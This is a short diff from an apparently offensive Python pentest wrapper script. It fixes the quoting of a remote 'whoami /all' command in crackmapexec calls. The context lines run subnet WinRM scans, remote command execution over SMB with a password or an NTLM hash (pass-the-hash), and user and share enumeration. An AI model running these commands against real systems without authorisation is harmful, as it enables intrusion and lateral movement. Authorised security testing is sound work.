@@ -2032,7 +2032,7 @@ while True:
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x whoami /all")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -x 'whoami /all'")
 
             print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --users")
@@ -2047,7 +2047,7 @@ while True:
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
          
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x whoami /all")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' -x 'whoami /all'")
 
             print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H ':" + NTM.rstrip(" ") +"' --users")
